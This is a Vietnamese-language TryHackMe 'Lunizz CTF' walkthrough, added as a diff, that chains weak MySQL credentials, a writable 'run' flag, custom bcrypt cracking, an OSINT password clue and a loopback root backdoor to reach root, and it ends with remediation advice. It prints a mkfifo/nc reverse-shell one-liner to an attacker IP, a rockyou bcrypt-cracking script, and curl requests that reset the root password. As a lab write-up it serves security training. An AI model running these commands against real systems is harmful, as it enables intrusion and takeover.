@@ -1,0 +1,247 @@
+---
+title: 'Lunizz CTF'
+description: 'Phiên bản tiếng Việt: Một command executor bị gác bằng cờ MySQL biến creds DB yếu thành RCE, rồi một sơ đồ base64+bcrypt tự chế, một manh mối OSINT, và một backdoor root trên loopback nối trọn đường lên root trên box Linux boot2root này.'
+date: 2025-12-01
+platform: tryhackme
+room: 'Lunizz CTF'
+roomUrl: 'https://tryhackme.com/room/lunizzctfnd'
+difficulty: medium
+tags:
+  - 'linux'
+  - 'mysql'
+  - 'rce'
+  - 'bcrypt'
+  - 'password-cracking'
+  - 'osint'
+  - 'privesc'
+vulnClasses:
+  - 'weak credentials'
+  - 'insecure command execution'
+  - 'custom password hashing'
+  - 'insecure privileged service'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Lunizz CTF — RCE bị gác bằng MySQL, một sơ đồ bcrypt tự chế, và một Root Backdoor**
+
+_Bài hướng dẫn giải "Lunizz CTF", một box Linux boot2root trên TryHackMe. Một web command-runner bị cố ý vô hiệu cho đến khi một cờ trong bảng MySQL được lật — creds database yếu cho phép ta lật nó và đoạt RCE. Từ shell www-data, ta crack một hash base64-rồi-bcrypt cố tình gây khó bằng một keygen tự chế, pivot qua hai người dùng (một mật khẩu giấu sau một manh mối OSINT từ ảnh), và kết thúc bằng cách lạm dụng một backdoor root trên loopback sẵn sàng đặt lại mật khẩu root._
+
+> Flag, mật khẩu, và hash đã được ẩn. Lunizz CTF là phòng huấn luyện hợp pháp trên TryHackMe; mọi thao tác thực hiện trên mục tiêu luyện tập được phép. Flag hiển thị dạng `thm{<redacted>}` và bí mật thu được dạng `<redacted>` — thật trên box nhưng được giữ kín ở đây.
+
+---
+
+### **TL;DR — toàn bộ chuỗi tấn công**
+
+<Callout type="tldr">
+
+Recon tìm thấy một **command executor trên :5000** từ chối chạy mọi thứ → web enumeration lộ creds MySQL `runcheck:<redacted>` → trong DB, bảng `runornot.runcheck` giữ một cờ `run = 0`; lật nó thành **1** và executor sống dậy → **RCE → reverse shell với tư cách** **`www-data`** → một script bị lộ trong `/proct/pass/` băm mật khẩu kiểu **base64-rồi-bcrypt**, nên một **keygen tự chế** crack được trong khi John thuần túy thì không → `su adam` → một manh mối OSINT (một link Google Maps tới một điểm _bắc cực quang_) chính là **mật khẩu của mason** → `su mason`, lấy **user.txt** → một backdoor root trên **127.0.0.1:8080** chấp nhận `cmdtype=passwd` và **đặt lại mật khẩu root** → `su -`, lấy **r00t.txt**.
+
+Recon không xác thực → root, qua creds yếu, một cờ "run" ghi được, crypto tự chế, OSINT, và một dịch vụ đặc quyền thiếu an toàn.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-tun0-ip>
+```
+
+Một lượt quét rustscan/nmap cho thấy một host Linux nhiều dịch vụ:
+
+```text
+22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu
+80/tcp    open  http     Apache 2.4.41 (default page)
+3306/tcp  open  mysql    MySQL 8.0.42
+4444/tcp  open  unknown  "Can you decode this for me?" + base64  (rabbit hole)
+5000/tcp  open  unknown  custom web "command" service
+33060/tcp open  mysqlx   MySQL X protocol
+```
+
+Cổng **4444** nhử các chuỗi base64 (`ZXh0cmVtZXNlY3VyZXJvb3RwYXNzd29yZA==` → `extremesecurerootpassword`, v.v.) — mồi nhử chẳng dẫn tới đâu. Trọng tâm thực sự là **command runner ở :5000** và **MySQL**.
+
+### **Lỗ hổng — một command runner bị gác bằng một cờ MySQL ghi được**
+
+Dịch vụ :5000 trông như đáng lẽ phải chạy các lệnh bạn gửi, nhưng nó không bao giờ làm. Web enumeration giải thích vì sao — và trao cho ta chìa khóa để bật nó lên.
+
+```text
+gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/big.txt -t 128
+# /hidden   (301)
+# /whatever (301)
+gobuster dir -u http://$IP/ -w .../directory-list-2.3-medium.txt -x txt -t 128
+# /instructions.txt (200)
+```
+
+Những trang đó cho thấy việc thực thi lệnh được bật/tắt bởi một giá trị trong database, và chúng lộ một bộ thông tin đăng nhập MySQL:
+
+```text
+runcheck:<redacted>
+```
+
+<Callout type="insight">
+
+Lỗi thiết kế là coi một **hàng MySQL mà client tiếp cận được như một công tắc phân quyền**. Executor tin vào `runornot.runcheck.run` để quyết định có chạy lệnh hay không, nhưng user DB `runcheck` lại có thể _ghi_ vào hàng đó. Bất kỳ ai đến được MySQL với creds đó đều kiểm soát công tắc — nên creds yếu, bị lộ trở thành remote code execution.
+
+</Callout>
+
+### **Bước 1 — lật cờ "run" trong MySQL để mở khóa RCE**
+
+Kết nối với creds bị lộ (bắt buộc TLS) và kiểm tra bảng đang gác:
+
+```text
+mysql -u runcheck -h $IP -p --ssl --ssl-verify-server-cert=FALSE
+
+MySQL [(none)]> use runornot;
+MySQL [runornot]> select * from runcheck;
+# +-----+
+# | run |
+# +-----+
+# |   0 |   <- executor disabled
+# +-----+
+MySQL [runornot]> update runcheck set run = 1;
+MySQL [runornot]> select * from runcheck;
+# | run | = 1   <- executor now live
+```
+
+Với `run = 1`, command runner ở :5000 thực thi đầu vào của ta — một nguyên thủy **remote code execution** thẳng thắn.
+
+### **Bước 2 — từ RCE sang reverse shell với tư cách www-data**
+
+Dựng một listener, rồi cho executor bắn một reverse shell ngược về:
+
+```text
+# attacker
+nc -lvnp 4444
+
+# executed via the :5000 runner
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ATTACKER_IP 4444 >/tmp/f
+```
+
+```text
+connect to [$ATTACKER_IP] from (UNKNOWN) [$IP]
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@lunizz:/var/www/html/whatever$
+```
+
+Ta đáp xuống với tư cách `www-data`. Nhìn quanh thư mục gốc của hệ thống tệp, một thư mục bất thường nổi bật: `/proct/`.
+
+### **Bước 3 — www-data → adam: crack một hash base64-rồi-bcrypt**
+
+Bên trong `/proct/pass/` là một helper bị lộ, `bcrypt_encryption.py`, tiết lộ chính xác cách mật khẩu tiếp theo được băm — và để lại hash trong một comment:
+
+```text
+import bcrypt, base64
+passw = "wewillROCKYOU".encode('ascii')      # hint: use rockyou
+b64str = base64.b64encode(passw)             # base64 FIRST
+hashAndSalt = bcrypt.hashpw(b64str, bcrypt.gensalt())
+# hashAndSalt = b'$2b$12$<redacted-bcrypt-hash>'
+```
+
+<Callout type="insight">
+
+Điểm xảo: mỗi ứng viên được **base64-encode trước khi bcrypt-hash**. Nếu đẩy thẳng `rockyou.txt` vào John/Hashcat thì không bao giờ khớp, vì công cụ băm từ gốc chứ không băm dạng base64 của nó. Bạn phải tái tạo đúng pipeline của ứng dụng — và salt của bcrypt chính là 29 ký tự đầu của chuỗi `$2b$12$...` bị lộ.
+
+</Callout>
+
+Một keygen nhỏ tái sử dụng salt bị lộ và thứ tự base64-rồi-bcrypt để brute-force theo rockyou:
+
+```text
+import bcrypt, base64
+salt = b'$2b$12$<redacted-salt>'
+target = b'$2b$12$<redacted-bcrypt-hash>'
+for word in open('rockyou.txt', encoding='latin-1'):
+    cand = base64.b64encode(word.strip().encode('ascii', 'ignore'))
+    if bcrypt.hashpw(cand, salt) == target:
+        print('cracked:', word.strip()); break
+# -> cracked (value redacted)
+```
+
+Với mật khẩu thu được, ta chuyển user:
+
+```text
+su adam        # password: <redacted>
+```
+
+### **Bước 4 — adam → mason: một manh mối OSINT từ ảnh (user flag)**
+
+Home của adam có vài artifact `runasmason*` và một ghi chú giấu trong `~/Desktop/.archive/`:
+
+```text
+cat ~/Desktop/.archive/to_my_best_friend_adam.txt
+# do you remember our place
+# i love there it's soo calming
+# i will make that lights my password
+# https://www.google.com/maps/@68.5090469,27.481808,3a,75y,...
+```
+
+Link Maps trỏ tới một địa điểm cực bắc, và "that lights" + "calming" là một gợi ý rõ ràng về **bắc cực quang (northern lights)** — một từ duy nhất chính là mật khẩu của mason:
+
+```text
+su mason       # password: <redacted>  (the "lights" from the clue)
+cat /home/mason/user.txt
+# thm{<redacted>}
+```
+
+### **Bước 5 — mason → root: lạm dụng backdoor root trên loopback (root flag)**
+
+Với tư cách mason, các listener cục bộ cho thấy một dịch vụ bind vào loopback ở **:8080**, và nó chạy dưới quyền **root**:
+
+```text
+ss -tulpn        # 127.0.0.1:8080 LISTEN
+ps aux | grep 127.0.0.1
+# root ... php -S 127.0.0.1:8080 -t /root/
+```
+
+Đó là "Mason's Root Backdoor", nhận một POST với `password` và `cmdtype` (`lsla`, `reboot`, `passwd`). Gợi ý mật khẩu — _"\[your place ;)\]"_ — chính là câu trả lời OSINT. `lsla` đã liệt kê `/root` dưới quyền root, nhưng `passwd` mới là đòn quyết định: nó **đặt lại mật khẩu root** thành bất cứ gì ta gửi:
+
+```text
+curl http://127.0.0.1:8080 -X POST -d 'password=<redacted>&cmdtype=lsla'
+# (directory listing of /root, as root)
+
+curl http://127.0.0.1:8080 -X POST -d 'password=<redacted>&cmdtype=passwd'
+# Password Changed To :<redacted>
+```
+
+Với mật khẩu root giờ đã biết, ta chỉ việc nâng quyền:
+
+```text
+su -           # password: <redacted>
+cat /root/r00t.txt
+# thm{<redacted>}
+```
+
+Recon → creds DB yếu → lật một cờ → RCE → crack crypto tự chế → OSINT → root backdoor → toàn quyền root.
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — xâm phạm root từ xa hoàn toàn.** Một điểm đại diện cho RCE foothold là **CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`): command runner tiếp cận được từ xa và chỉ bị gác bởi một hàng database mà creds yếu, bị lộ cho phép bất kỳ ai lật. Từ đó box nối chuỗi toàn những điểm yếu attacker có thể tái hiện:
+
+- **Creds yếu/bị lộ + một cờ "phân quyền" ghi được** biến truy cập MySQL thành thực thi code.
+- **Băm mật khẩu tự chế** (base64-rồi-bcrypt) với hash và salt để lại trên đĩa — che giấu, không phải bảo mật.
+- **Bí mật có thể suy ra bằng OSINT** (một manh mối từ ảnh được tái dùng làm mật khẩu).
+- **Một backdoor root trên loopback** đặt lại mật khẩu root theo yêu cầu — bất kỳ ai đến được loopback với tư cách user bất kỳ đều thành root.
+
+</Callout>
+
+### **Khắc phục đề xuất**
+
+<Callout type="fix">
+
+1. **Không bao giờ gác việc thực thi lệnh bằng một giá trị client ghi được**, và đừng phơi bày một endpoint "chạy lệnh" nói chung. Nếu bắt buộc phải thực thi phía server, hãy dùng một allow-list cố định và một kiểm tra phân quyền thực sự phía server — không phải một hàng MySQL mà chính user DB của app có thể lật.
+2. **Dùng credentials database mạnh, duy nhất** và user DB tối thiểu quyền; vai trò web không nên có khả năng ghi lại dữ liệu điều khiển. Giữ MySQL ngoài các mạng không tin cậy.
+3. **Đừng tự viết sơ đồ mật khẩu.** bcrypt thì ổn, nhưng bọc base64 và để hash/salt trong một script ai cũng đọc được làm hỏng mục đích. Lưu hash ngoài web root với quyền đúng.
+4. **Gỡ bỏ hoàn toàn "backdoor" trên loopback.** Một tiến trình root đặt lại mật khẩu root theo một yêu cầu gần như không xác thực là một món quà leo thang đặc quyền thẳng thừng; không dịch vụ hợp pháp nào cần nó.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **Phân quyền phải nằm ở phía server.** Một "feature flag" mà attacker ghi được không phải là một biện pháp kiểm soát — ở đây một câu lệnh `UPDATE` duy nhất đã mua được RCE.
+- **Khớp đúng pipeline băm của mục tiêu.** John thuần túy thất bại với base64-rồi-bcrypt; tái tạo thứ tự của app (và tái dùng salt bị lộ) crack được trong một script ngắn.
+- **OSINT là một phần của bề mặt tấn công.** Một ghi chú tình cảm cộng với một link Maps đã trao luôn một mật khẩu user — người thật tái dùng đúng kiểu này.
+- **Enumerate các dịch vụ cục bộ, chạy dưới quyền root.** Nấc cuối không phải một kernel exploit hay một SUID binary — mà là một web app root trên loopback làm điều nó không bao giờ nên làm.
+
+Cảm ơn bạn đã đọc. Lunizz CTF là một chuyến tham quan những cấu hình sai "nhỏ" — một cờ ghi được, creds bị lộ, crypto tự chế, một mật khẩu OSINT, một backdoor "tốt bụng" — xếp chồng gọn gàng từ một lượt quét ẩn danh cho tới tận root.
